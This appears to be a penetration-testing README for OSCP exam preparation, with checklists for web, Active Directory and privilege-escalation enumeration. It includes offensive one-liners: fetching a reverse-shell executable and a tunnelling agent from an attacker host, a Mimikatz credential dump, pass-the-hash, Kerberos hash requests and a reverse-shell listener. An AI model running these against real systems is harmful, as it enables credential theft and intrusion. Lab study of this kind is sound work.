# Penetration Testing Checklists and Cheatsheets

This repository contains various checklists and cheatsheets to aid in penetration testing and preparing for the Offensive Security PEN-200 OSCP+ exam.

Further Source:
[HACKTRICKS](https://book.hacktricks.xyz/)
[THE HACKER RECIPES](https://www.thehacker.recipes/)

## Table of Contents

1. [Commands Cheat Sheet](#commands-cheat-sheet)
   
3. [General Checklists](#general-checklists)
   - [General Checklist Before Starting](#general-checklist-before-starting)
   - [General Checklist for Web Applications](#general-checklist-for-web-applications)
4. [Detailed Checklists](#detailed-checklists)
   
   - [Web Application Pre-Authentication Checklist](#web-application-pre-authentication-checklist)
   - [Web Application Directory Enumeration Checklist](#web-application-directory-enumeration-checklist)
   - [Web Application Login Checklist](#web-application-login-checklist)
     
   - [Finding Vulnerabilities and Exploits Checklist](#finding-vulnerabilities-and-exploits-checklist)
     
   - [Network Discovery and Port Scan Checklist](#network-discovery-and-port-scan-checklist)
     
   - [Active Directory General Checklist](#active-directory-general-checklist)
   - [Active Directory with Credentials Checklist](#active-directory-with-credentials-checklist)
   - [Active Directory without Credentials Checklist](#active-directory-without-credentials-checklist)
   - [Active Directory Kerberos Checklist](#active-directory-kerberos-checklist)
   - [Active Directory Lateral and Vertical Movement Checklist](#active-directory-lateral-and-vertical-movement-checklist)
     
   - [Privilege Escalation Windows Checklist](#privilege-escalation-windows-checklist)
   - [Privilege Escalation Linux Checklist](#privilege-escalation-linux-checklist)
   - [Ligolo-ng Checklist](#ligolo-ng-checklist)

---

## Commands Cheat Sheet

### Full TTY (BETTER USE [PENELOPE](https://github.com/brightio/penelope))

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ls='ls -arlht --color=auto'
stty columns 200 rows 200
```

### Windows PowerShell Commands
EXECUTION POLICY
```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
powershell -ExecutionPolicy Bypass -File .\PowerView.ps1
```
Show file like with Tree
```powershell
Get-ChildItem -Path "./*" -Include "*" -Recurse -ErrorAction SilentlyContinue
```
```powershell
Get-ChildItem -Path "C:\Users\*" -Include "flag.txt", "local.txt", "user.txt", "password.txt", "proof.txt", "credentials.txt" -Recurse -ErrorAction SilentlyContinue
```
Download
```powershell
wget http://192.168.123.100:8000/rev4445.exe -OutFile rev4445.exe
```
```powershell
certutil -split -urlcache -f http://192.168.123.100:8000/agent.exe agent.exe
```
Mimikatz Oneliner
```powershell
.\mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred" "exit"
```
## General Checklists

### General Checklist Before Starting

1. Authenticate with credentials to BloodHound.
2. Perform quick enumeration in BloodHound.
3. Ensure you claim all flags and collect sufficient screenshots.
4. Check anonymous or guest access to SMB shares on all IPs as a good starting point.
5. Step back and attack the Domain Controller as if you do not have credentials.
6. Also try default credentials like `offsec:lab`.
7. Enumerate MS01 until the end, even if you have local admin—use WinPEAS as well.
8. If other credentials are found, repeat the enumeration phase.
9. Try using the username as the password (both domain and local).
10. Use `nxc smb 192.168.123.100 -u adcreds.txt -p adcreds.txt --no-bruteforce`.
11. Use `nxc smb 192.168.123.100-160 --local-auth -u adcreds.txt -p adcreds.txt --no-bruteforce`.
12. Check all shares with the current user, guest, and anonymous access.
13. Use `rpcdump` and `enum4linux` with credentials.
14. Enumerate users with Kerbrute:

    ```bash
    /Tools/kerbrute_linux_amd64 userenum -d domain.com --dc 192.168.123.100 $SECLIST/Usernames/Names/names.txt
    ```

15. Continue using Kerbrute until you have the naming schema, lots of users, and service accounts. Refer to [service-accounts.txt](https://github.com/crtvrffnrt/wordlists/blob/main/service-accounts.txt).
16. Request AS_REP messages:

    ```bash
    impacket-GetNPUsers domain.com/ -usersfile adcreds.txt -dc-ip 192.168.123.100 -request -outputfile hash.hash
    ```

    [ASREPRoast HackTricks Guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast#request-as_rep-message)

17. Perform a UDP scan.
18. Repeat your steps—**Enumeration is key; try harder.**
19. Run WinPEAS with user or local admin privileges again.
20. Connect to SMB with:

    ```bash
    impacket-smbclient domain.com/guest@192.168.123.100
    ```

21. Step back and review your enumeration to ensure nothing was missed.

### General Checklist for Web Applications

1. Disable any ad-blockers, cookie-plugins or useragent-switcher.
2. Find web servers in scope:

    ```bash
    nmap -vv -sV -p 80,443,8080,8443,8000,8888,8800,8088,8880,10443,9443 --script http-title --open --min-rate 3000 -T4 192.168.123.100
    ```

3. Identify the tech stack using `whatweb`, `wappalyzer`, or `httpx`.
4. Check the website using [web-check.as93.net](https://web-check.as93.net/).
5. Use `feroxbuster` for directory enumeration:

    ```bash
    feroxbuster -u http://domain.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
    ```

6. Search for PDFs:

    ```bash
    feroxbuster -u http://192.168.123.100/ -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -x pdf -q | grep '\.pdf$'
    ```

7. Scan with Nessus, Nuclei, Nikto, or Sn1per.
8. Check network interactions via browser DevTools.
9. Perform a Burp Suite Pro scan.
10. Enumerate subdomains:

    ```bash
    echo domain.com | subfinder -silent | httpx -silent -sc -title -td -ip -cname -cl -lc -server -efqdn -fr
    ```

11. Create a list of directories using Burp Suite and input them to `feroxbuster` to get a comprehensive sitemap.
12. Find exploits using Sploitus, SearchSploit, and CVEMap.
13. Check for LFI/RFI vulnerabilities.
14. Proceed to the [Web Application Login Checklist](#web-application-login-checklist).
15. Attempt to brute-force the login page.
16. Try different usernames.
17. Check if there is a Git repository.
18. Revert the machine if necessary.
19. Remember, **Enumeration is key; step back and try harder.**
20. Verify all findings and ensure no steps were missed.

## Detailed Checklists

### Web Application Pre-Authentication Checklist

1. Disable ad-blockers.
2. Identify the web server in scope:

    ```bash
    nmap -vv -sV -p 80,443 --script http-title --open --min-rate 3000 -T4 192.168.123.100
    ```

3. Use `whatweb` to identify the tech stack:

    ```bash
    whatweb http://192.168.123.100:9000/
    ```

4. Check the website using [web-check.as93.net](https://web-check.as93.net/).
5. Use `httpx` for detailed information:

    ```bash
    httpx -u http://192.168.123.100:9000/ -td -sc -cl -ct -location -rt -lc -wc -title -server -method -websocket -ip -cname -asn -cdn -probe
    ```

6. Use browser extensions like Wappalyzer and Katana.
7. Google the exact website title for additional information.
8. Run a small `feroxbuster` scan:

    ```bash
    feroxbuster -u http://domain.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
    ```

9. Search for PDFs:

    ```bash
    feroxbuster -u http://192.168.123.100/ -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -x pdf -q | grep '\.pdf$'
    ```

10. Scan with tools like Nessus, Nuclei, Nikto, and Sn1per.
11. Check network interactions via browser DevTools.
12. Perform a Burp Suite Pro scan.
13. Enumerate subdomains:

    ```bash
    echo domain.com | subfinder -silent | httpx -silent -sc -title -td -ip -cname -cl -lc -server -fr
    ```

14. Create a list of directories using Burp Suite and input them to `feroxbuster`:

    ```bash
    cat rest.txt | feroxbuster --stdin -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -E -x txt,php,html,js,json,xml,yaml,tf,sh,bash,py,tmp,lua,pem,pkk -d 2 -m POST,GET
    ```

15. Find exploits using Sploitus, SearchSploit, and CVEMap.
16. Check for LFI/RFI vulnerabilities.
17. Proceed to the [Web Application Login Checklist](#web-application-login-checklist).
18. Attempt to brute-force the login page.
19. Try different usernames.
20. Check if there is a Git repository.
21. Revert the machine if necessary.
22. Remember, **Enumeration is key; step back and try harder.**
23. Verify all findings and ensure no steps were missed.

### Web Application Directory Enumeration Checklist

1. Check `robots.txt`.
2. Check `sitemap.xml`.
3. Run `feroxbuster`:

    ```bash
    feroxbuster -u https://192.168.123.100
    ```

4. Use `feroxbuster` with specific wordlists and file extensions:

    ```bash
    feroxbuster -u http://192.168.123.100 -w $SECLIST/Discovery/Web-Content/raft-large-words-lowercase.txt -x php,bash,sh,txt,bak,backup,sql
    ```

5. Perform deeper enumeration:

    ```bash
    feroxbuster -u http://192.168.123.100/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 80 --filter-status 404,500 --depth 2
    ```

6. Use Katana for URL discovery:

    ```bash
    katana -u http://192.168.123.100/
    ```

7. Collect base URLs in Burp Suite and export them to `rest.txt`.
8. Input `rest.txt` to `feroxbuster` for further enumeration:

    ```bash
    cat rest.txt | feroxbuster --stdin -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -E -x txt,php,html,js,json,xml,yaml,tf,sh,bash,py,tmp,lua,pem,pkk -d 2 -m POST,GET
    ```

9. Search for hidden files and directories.
10. Repeat enumeration steps—**Enumeration is key; try harder.**
11. Verify all findings and ensure no steps were missed.

### Web Application Login Checklist

1. Try empty username and password fields.
2. Use the username as the password.
3. Search for default credentials.
4. Bruteforce with small username and password lists.
5. Fuzz for special characters using:

    ```bash
    /usr/share/seclists/Fuzzing/special-chars.txt
    ```

6. Attempt to bypass the login page.
7. Bruteforce with a userlist and a password list generated from `cewl`.
8. Check for account lockout policies.
9. Analyze error messages for hints.
10. Step back and review your enumeration—**try harder.**
11. Ensure all possible avenues have been explored.

### Finding Vulnerabilities and Exploits Checklist

1. Use `searchsploit` to find exploits:

    ```bash
    searchsploit -u
    searchsploit --cve CVE-2019-7214
    searchsploit application_name
    ```

2. Use Google to search for known vulnerabilities.
3. Use CVEMap for detailed searches:

    ```bash
    cvemap -p application_name -k
    cvemap -q "Vendor" -q "Product"
    ```

4. Search inside Metasploit for available modules.
5. Use Sploitus and Exploit-DB for additional resources.
6. Revert the machine if necessary and research in detail.
7. Double-check all findings to ensure accuracy.
8. Remember, **Enumeration is key; step back and try harder.**
9. Ensure all possible vulnerabilities have been identified.

### Network Discovery and Port Scan Checklist

1. **Passive Discovery**:
   - Use `netdiscover` for ARP scanning:

     ```bash
     netdiscover -i eth1 -r 192.168.123.0/24 -p
     ```

   - Listen for inbound traffic:

     ```bash
     sudo tcpdump -i eth1 'dst host 192.168.123.100 and (icmp or udp or tcp or arp)'
     ```

   - Run Responder:

     ```bash
     responder -I eth1 -A
     ```

2. **Active Discovery**:
   - Use `netdiscover`:

     ```bash
     netdiscover -i eth1 -r 192.168.123.0/24
     ```

   - Ping sweep with Nmap:

     ```bash
     nmap -PE -PM -PP -sn -n --open 192.168.123.0/24
     ```

   - Use `fping`:

     ```bash
     fping -asgq 192.168.123.0/24
     ```

3. **Port Scanning**:
   - Use `masscan` for a quick scan:

     ```bash
     masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 192.168.123.0/24
     ```

   - Perform a detailed Nmap scan:

     ```bash
     nmap -p- -v --min-rate 4000 -sV 192.168.123.100
     nmap -p open_ports_here -vv --min-rate 1000 -sV -sC 192.168.123.100
     ```

   - Scan UDP ports:

     ```bash
     sudo nmap -Pn -n 192.168.123.100 -sU --top-ports=100
     ```

4. **UDP Protocol Scanning**:
   - Use Nmap for UDP version scanning:

     ```bash
     nmap -sUV --reason -F --version-intensity 0 --min-rate 5000 --max-retries 1 192.168.123.100
     ```

   - Use `udp-proto-scanner`:

     ```bash
     # Refer to the GitHub repository for usage instructions
     ```

5. Revert the machine if necessary.
6. Repeat scanning steps—**Enumeration is key; try harder.**
7. Verify all findings and ensure no steps were missed.

### Active Directory General Checklist

1. Define the primary target.
2. Reference the [Pentest AD Mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg).
3. Use SharpHound and BloodHound for enumeration.
4. Remember, **Enumeration is key;** repeat the process for each user owned.
5. Proceed to the enumeration checklist.
6. Review Kerberos-related checklists.
7. Attempt DCSync and DCShadow attacks.
8. Run Responder.
9. If a mail server is present, send an email with `config.Library-ms`.
10. Use `enum4linux` for enumeration.
11. Discover the Sysvol share from the Domain Controller.
12. After obtaining a shell with `psexec`, check permissions.
13. Perform an LDAP dump with `ldapdomaindump` and check descriptions.
14. Use `jq` to parse JSON data for interesting fields.
15. Reference [Active Directory Enumeration - Pentest Everything](https://pentesteverything.gitbook.io/pentest-everything/penetration-testing/enumeration/active-directory-enumeration) for additional techniques.
16. Recollect data with BloodHound if stuck.
17. Repeat enumeration steps—**Enumeration is key; try harder.**
18. Verify all findings and ensure no steps were missed.

### Active Directory with Credentials Checklist

1. Define your goal and act accordingly.
2. Add the Domain Controller's hostname to `/etc/hosts`.
3. Check the current user.
4. Check current user group memberships:

    ```bash
    whoami /groups /fo list | findstr Name
    ```

5. Identify the Domain Controller:

    ```powershell
    Get-NetDomain
    ```

6. Identify domain admins:

    ```bash
    net group "Domain Admins" /domain
    ```

7. Check for domain trusts.
8. Run Responder.
9. Check for SMB null sessions.
10. Check users' domain group memberships present on the current host:

    ```bash
    net user username /domain
    ```

11. Identify service accounts and hosts related to them.
12. Find who is logged on to different hosts.
13. Check local admin groups and other local groups.
14. Use `Find-LocalAdminAccess`.
15. Find users with reversible encryption.
16. Check domain admin group and other domain groups.
17. Check enterprise admin group.
18. Check Organizational Units (OUs):

    ```powershell
    Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName
    ```

19. Use `impacket-rpcdump` for RPC enumeration.
20. Identify the Primary Domain Controller (PDC).
21. Check for disabled accounts that may be admin.
22. Attempt DCSync and use `ldapdomaindump`.
23. Check for passwords in comments, descriptions, or other fields.
24. Parse BloodHound exports for interesting properties using `jq`:

    ```bash
    cat domain_users.json | jq '.[] | select(.attributes.description != null and .attributes.description[0] != null) | {sAMAccountName: .attributes.sAMAccountName[0], description: .attributes.description[0]}'
    ```

25. Enumerate computers in the domain.
26. Discover the Sysvol share from the Domain Controller.
27. Find domain admins' sessions on different PCs.
28. Find old devices.
29. Mount all accessible shares and inspect them thoroughly.
30. Check if the current user has local admin permissions on other PCs with `Find-LocalAdminAccess`.
31. Check ACLs and ACEs for the current user:

    ```powershell
    Find-InterestingDomainAcl | select ObjectDN, AceType
    ```

32. Check if the user has ACL permissions on groups.
33. Check if the user can reset passwords for other users.
34. Examine the local host thoroughly.
35. Check local admins with `Find-LocalAdminAccess`.
36. Use BloodHound, SharpHound, and RustHound for enumeration.
37. Check AD object descriptions.
38. Parse JSON data for descriptions using `jq`:

    ```bash
    cat bloodhound_users.json | jq '.data[] | select(.Properties.description != null) | {samaccountname: .Properties.name, description: .Properties.description}'
    ```

39. Check local admins of Domain Controllers.
40. In BloodHound, check outbound object control of owned users.
41. Find ASREPRoastable users.
42. Request AS_REP messages with `impacket-GetNPUsers`:

    ```bash
    impacket-GetNPUsers domain.com/username:'Password123!' -dc-ip 192.168.123.100 -request -o ./oscp.kerb
    ```

43. Find Kerberoastable users.
44. Enumerate SPNs with `nxc ldap`:

    ```bash
    nxc ldap 192.168.123.0/24 -u 'username' -p 'password' --kerberoast spns.txt
    ```

45. Repeat enumeration steps—**Enumeration is key; try harder.**
46. Verify all findings and ensure no steps were missed.

### Active Directory without Credentials Checklist

1. Add the Domain Controller's hostname to `/etc/hosts`.
2. Enumerate users with Kerbrute:

    ```bash
    /Tools/kerbrute_linux_amd64 userenum -d domain.com --dc 192.168.123.100 $SECLIST/Usernames/Names/names.txt
    ```

3. Continue enumeration until you have the naming schema.
4. Use wordlists like [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames/tree/master/facebook-base-lists).
5. Merge wordlists to create a comprehensive `names.txt`:

    ```bash
    cat *.txt | sort -u > allnames.txt
    ```

6. Request AS_REP messages:

    ```bash
    impacket-GetNPUsers domain.com/ -usersfile adcreds.txt -dc-ip 192.168.123.100 -request -outputfile hash.hash
    ```

    [ASREPRoast HackTricks Guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast#request-as_rep-message)

7. Enumerate service accounts with specialized wordlists.
8. Try using the username as the password.
9. Identify the Domain Controller.
10. Run Responder.
11. Use `rpcclient` for RPC enumeration:

    ```bash
    rpcclient 192.168.123.100 -U ""
    rpcclient 192.168.123.100 -U "domain.com\guest"
    ```

12. Use more `rpcclient` commands:

    ```bash
    rpcclient -U 'domain.com\guest' -c "
        srvinfo;
        enumdomusers;
        queryuserdomainsid;
        enumgroups;
        enumdomgroups;
        enumprinters;
        enumservices;
        getdompwinfo;
        lsaenumsid;
        lsaqueryinfopol;
        querydispinfo;
        enumtrustdom;
        netshareenum;
        samrlookuprids;
    " 192.168.123.100
    ```

13. Check all SIDs with:

    ```bash
    :lookupsids S-1-5-80-...
    ```

14. Check for SMB null sessions.
15. Check for SMB guest sessions.
16. Use `nxc smb` to enumerate shares:

    ```bash
    nxc smb 192.168.123.100 -u "a" -p "" --shares
    nxc smb 192.168.123.100 -u "guest" -p "" --shares
    ```

17. Use `enum4linux` for additional enumeration:

    ```bash
    enum4linux -a 192.168.123.100
    ```

18. Use `impacket-rpcdump` for RPC enumeration.
19. Attempt anonymous LDAP dumps with `ldapdomaindump`:

    ```bash
    ldapdomaindump 192.168.123.100
    ```

20. Use `ldapsearch` for LDAP enumeration:

    ```bash
    ldapsearch -x -h 192.168.123.100 -b "dc=domain,dc=com"
    ```

21. Repeat enumeration steps—**Enumeration is key; try harder.**
22. Verify all findings and ensure no steps were missed.

### Active Directory Kerberos Checklist

1. Ensure you use FQDNs, not IP addresses.
2. Check the [Kerberos Cheat Sheet](Kerberos-Cheat%20Sheet.pdf) for reference.
3. Enumerate usernames with Kerbrute.
4. Check current tickets with `klist`.
5. List tickets with Rubeus:

    ```powershell
    Rubeus.exe klist
    ```

6. Dump tickets and attempt to crack them.
7. Check for Kerberoastable accounts.
8. Create Silver Tickets if possible.
9. Perform ASREPRoasting with a complete user list.
10. Conduct AS-REQ password spraying with Rubeus.
11. Investigate unconstrained delegation.
12. Investigate constrained delegation.
13. Look for cached credentials.
14. Attempt to access LSASS memory.
15. Check for legacy protocols.
16. Verify if WDigest is enabled.
17. Enumerate SPNs with `nxc ldap`:

    ```bash
    nxc ldap 192.168.123.0/24 -u 'username' -p 'password' --kerberoast spns.txt
    ```

18. Repeat enumeration steps—**Enumeration is key; try harder.**
19. Verify all findings and ensure no steps were missed.

### Active Directory Lateral and Vertical Movement Checklist

1. Find who is logged on to different hosts:

    ```bash
    .\PsLoggedon.exe -accepteula \\COMPUTERNAME
    ```

2. Move laterally via RCE methods like PowerShell, WMIC, DCOM, or SC.
3. Move laterally with `psexec`.
4. Perform password spraying throughout the environment.
5. Use `Gomapexec` to attempt logins with valid credentials to different services.
6. Run Responder.
7. Run Snaffler to find sensitive files.
8. Pass the hash—reuse NTLM hashes:

    ```bash
    nxc smb 192.168.123.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
    ```

9. Perform overpass-the-hash attacks.
10. Export Kerberos tickets to reuse from other systems (pass-the-ticket).
11. Attempt RCE over DCOM.
12. Mount all accessible shares and inspect them thoroughly.
13. Use Mythicsoft Agent Ransack to search for files.
14. Repeat enumeration steps—**Enumeration is key; try harder.**
15. Verify all findings and ensure no steps were missed.

### Privilege Escalation Windows Checklist

1. Run Seatbelt or WinPEAS for initial enumeration.
2. Use `dsregcmd` to check domain registration.
3. Open PowerShell as admin.
4. Import PowerView:

    ```powershell
    Set-ExecutionPolicy Bypass -Scope Process
    Import-Module C:\Tools\PowerView.ps1
    Get-NetDomain
    ```

5. Rerun these steps with different users or attempt `RunAs` with different users or admin PowerShell.
6. Run Seatbelt with system checks:

    ```powershell
    Seatbelt.exe -group=system
    ```

7. Show hidden files and file extensions.
8. Gather system information:

    ```powershell
    systeminfo
    whoami /groups
    whoami /all
    ```

9. Check command history.
10. Examine environment variables:

    ```powershell
    Get-ChildItem Env:
    ```

11. Run WinPEAS for privilege escalation paths.
12. Enumerate existing users and groups.
13. List group memberships:

    ```powershell
    net user
    quser
    net localgroup
    net localgroup administrators
    ```

14. Get operating system details:

    ```powershell
    systeminfo
    Get-AppLockerPolicy
    ```

15. Examine AppLocker policies.
16. Check antivirus status:

    ```powershell
    Get-MpPreference
    Get-MpComputerStatus
    ```

17. Inspect the system path:

    ```powershell
    $env:PATH
    ```

18. List installed applications.
19. Check for KeePass installations.
20. Examine services—start disabled services if possible (e.g., SSH).
21. List running processes:

    ```powershell
    Get-Process | Sort-Object CPU -Descending
    ```

22. Check for service binary hijacking.
23. Inspect scheduled tasks.
24. Filter non-Microsoft tasks.
25. Use `Invoke-AllChecks` from PowerUp.
26. Check startup directories and autostart entries.
27. Attempt to `RunAs` different users.
28. Inspect the root of `C:\` drive.
29. Check for `Windows.old`.
30. Search for sensitive files:

    ```powershell
    Get-ChildItem -Path C:\Users\ -Include * -File -Recurse -ErrorAction SilentlyContinue
    ```

31. Attempt to dump SAM database information.
32. Run Live Forensicator scripts.
33. Search for flags using PowerShell one-liners.
34. Check `C:\Windows\System32\Drivers\etc\hosts`.
35. Repeat enumeration steps—**Enumeration is key; try harder.**
36. Verify all findings and ensure no steps were missed.

### Privilege Escalation Linux Checklist

1. Run LinPEAS and look for low-hanging fruit.
2. Check for red text on a yellow background.
3. List screen sessions:

    ```bash
    screen -list
    ```

4. List tmux panes:

    ```bash
    tmux list-panes
    ```

5. Attempt `sudo -i`.
6. Get hostname and OS version.
7. Check CPU architecture:

    ```bash
    lscpu
    ```

8. Review user activity:

    ```bash
    w
    last
    lastlog
    ```

9. Inspect autostart entries and scheduled tasks.
10. Check uptime:

    ```bash
    uptime -p
    ```

11. List cron jobs:

    ```bash
    crontab -l
    sudo crontab -l
    ls -la /etc/cron.daily
    ```

12. Examine shell configurations.
13. Check environment variables and bash configurations.
14. Review permissions.
15. Attempt `sudo -i` with known passwords.
16. Check `sudo` version:

    ```bash
    sudo -V
    ```

17. Inspect `/etc/passwd` and `/etc/shadow`.
18. Find SUID/SGID files:

    ```bash
    find / -perm /4000 2>/dev/null
    ```

19. Find world-writable directories and files:

    ```bash
    find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
    find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
    ```

20. Check `sudo` privileges:

    ```bash
    sudo -l
    ```

21. Find files with capabilities:

    ```bash
    getcap -r / 2>/dev/null
    ```

22. Check for unmounted drives.
23. Review command history.
24. Enumerate users and groups.
25. Check group memberships:

    ```bash
    getent groups
    ```

26. Inspect important configuration files.
27. Examine SSH configurations.
28. Look for password files.
29. Check temporary directories.
30. Inspect network configurations.
31. List open ports:

    ```bash
    netstat -tuepn
    netstat -tulpn
    ```

32. Check firewall rules.
33. Use `tcpdump` to listen on interfaces.
34. Look for common CVEs.
35. List running processes:

    ```bash
    ps aux
    ```

36. Use `pspy` to monitor processes:

    ```bash
    timeout 20 ./pspy64
    ```

37. Check for Docker configurations.
38. Find recent files and directories.
39. Search for Git repositories:

    ```bash
    find / -type d -name ".git"
    ```

40. Run LinPEAS for comprehensive enumeration:

    ```bash
    timeout 5m ./linpeas.sh
    ```

41. Reference [HackTricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).
42. Repeat enumeration steps—**Enumeration is key; try harder.**
43. Verify all findings and ensure no steps were missed.

### Ligolo-ng Checklist

1. **Setup Server Side (Attacker)**:
   - Create a TUN interface:

     ```bash
     sudo ip tuntap add user root mode tun ligolo
     sudo ip link set ligolo up
     ```

   - Run the proxy:

     ```bash
     ./proxy -selfcert
     ```

2. **Transfer `agent.exe` to Target**.
3. **Run Agent on Target**:

     ```powershell
     .\agent.exe -connect 192.168.123.100:11601 -ignore-cert
     ```

4. **Add Target Network as Route**:

     ```bash
     ip route add 192.168.123.0/24 dev ligolo
     ```

5. **In Ligolo**:
   - Enter session:

     ```
     session (choose the appropriate session)
     ```

   - Start the session:

     ```
     start
     ```

   - Confirm tunnels:

     ```
     tunnel_list
     ```

6. **Set Up Reverse Shell**:
   - Create a listener on the agent machine:

     ```bash
     listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
     ```

7. **Route Cleanup**:
   - Remove routes when done.


---

**Remember: Enumeration is the key. If you get stuck, step back, review your steps, and try harder.**
